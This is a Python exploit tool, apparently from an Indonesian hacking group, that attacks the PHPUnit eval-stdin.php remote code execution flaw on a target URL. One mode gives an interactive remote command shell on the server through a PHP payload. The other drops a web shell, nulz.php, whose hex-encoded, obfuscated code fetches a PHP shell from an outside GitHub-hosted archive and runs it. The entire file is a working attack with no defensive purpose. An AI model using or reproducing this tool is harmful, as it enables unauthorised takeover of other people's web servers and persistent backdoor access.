import requests, platform, time, re, sys, os

def banner():
    print('''
 ____  _   _ ____  _   _ _   _ ___ _____ 
|  _ \| | | |  _ \| | | | \ | |_ _|_   _|
| |_) | |_| | |_) | | | |  \| || |  | |  
|  __/|  _  |  __/| |_| | |\  || |  | |  
|_|   |_| |_|_|    \___/|_| \_|___| |_|  
                                         
██████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝
██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══╝  
██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝╚══════╝
By: NuLz | Haxorstars
''')
    
def clear():
    try:
        system_info = platform.system()
        if system_info == "Windows":
            time.sleep(1)
            os.system("cls")
            time.sleep(1)
        elif system_info == "Linux":
            time.sleep(1)
            os.system("clear")
            time.sleep(1)
        else:
            print("Terjadi Kesalahan.")
    except Exception as e:
        print("Terjadi Kesalahan.", e)

def payloadCMD(target):
    while True:
        input_cmd = input('CMD ~$: ')
        cmd = input_cmd.lower()
        if cmd == 'exit' or cmd == 'keluar':
            print('Anda Keluar!')
            break

        payload = "<?php if (function_exists('proc_open')) { $p = proc_open('"+cmd+"', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']],$pipes); if(is_resource($p)){fwrite($pipes[0],'input_data_here');fclose($pipes[0]);$o=stream_get_contents($pipes[1]);fclose($pipes[1]);$e=stream_get_contents($pipes[2]);fclose($pipes[2]);$r=proc_close($p);echo $o;}}elseif(function_exists('popen')){$h=popen('"+cmd+"','r');$c=fread($h,2096);echo$c;pclose($h);}elseif(function_exists('exec')){exec('"+cmd+"',$o,$r);if($r===0){$res=implode($o);echo$res;ob_flush();flush();}}elseif(function_exists('system')){system('"+cmd+"');}elseif(function_exists('passthru')){passthru('"+cmd+"');}elseif(function_exists('shell_exec')){shell_exec('"+cmd+"');}else{echo'Not Vuln!';}?>"
        req = requests.get(target, data=payload)
        res = req.text
        print(res)

def payloadUPSHELL(target):
    url = target
    pattern = re.compile(r'PHP/([^/]+)')
    match = pattern.search(url)
    if match:
        shell_url = pattern.sub(r'PHP/nulz.php', url)
    else:
        print("Terjadi Kesalahan, Mohon Periksa URL Target Anda.")

    payload = "<?php $upshell = file_put_contents('nulz.php', hex2bin('3c3f3d2f2a2a2a2a2f402f2a35353535352a2f6e756c6c3b202f2a2a2a2a2a2a2f402f2a35353535352a2f6576616c2f2a2a2a2a2a2a2f28223f3e222e66696c655f6765745f636f6e74656e7473282268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6861786f7273746172732f617263686976652f6d61696e2f616c66612f616c66612d67672e7068702229292f2a2a2a2a2a2a2f202f2a4279204e754c7a3430342a2f3f3e'));if ($upshell) {echo 'Upload Shell Success, shell name => nulz.php'.PHP_EOL;echo '"+shell_url+"';} else {echo 'Upload Shell Failed :(';}?>"
    req = requests.get(target, data=payload)
    res = req.text
    print(res)

def nulzGG():
    clear()
    banner()
    print('Target Example: https://domain.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
    target = input('TARGET >: ')
    print('''
[ Select Payload ]
--------------------------
[1] RCE (Command)
[2] UPSHELL (Upload Shell)
--------------------------
''')
    select_payload = input("Select >: ")
    if select_payload:
        try:
            selected_payload = int(select_payload)
            if selected_payload == 1:
                payloadCMD(target)
            elif selected_payload == 2:
                payloadUPSHELL(target)
        except ValueError:
            print('Mohon Masukan Pilihan Dengan Benar')
    else:
        print('Mohon Masukan Pilihan Dengan Benar')

if __name__ == '__main__':
    while True:
        try:
            nulzGG()
        except KeyboardInterrupt:
            quest = input('\nApakah anda ingin keluar? Y/N >: ')
            if quest:
                if quest == 'y' or quest == 'Y':
                    print('Anda Keluar!')
                    exit()
                elif quest == 'n' or quest == 'N':
                    continue
                else:
                    print('Mohon Masukan Pilihan Dengan Benar')
                    continue
            else:
                print('Mohon Masukan Pilihan Dengan Benar')
                continue
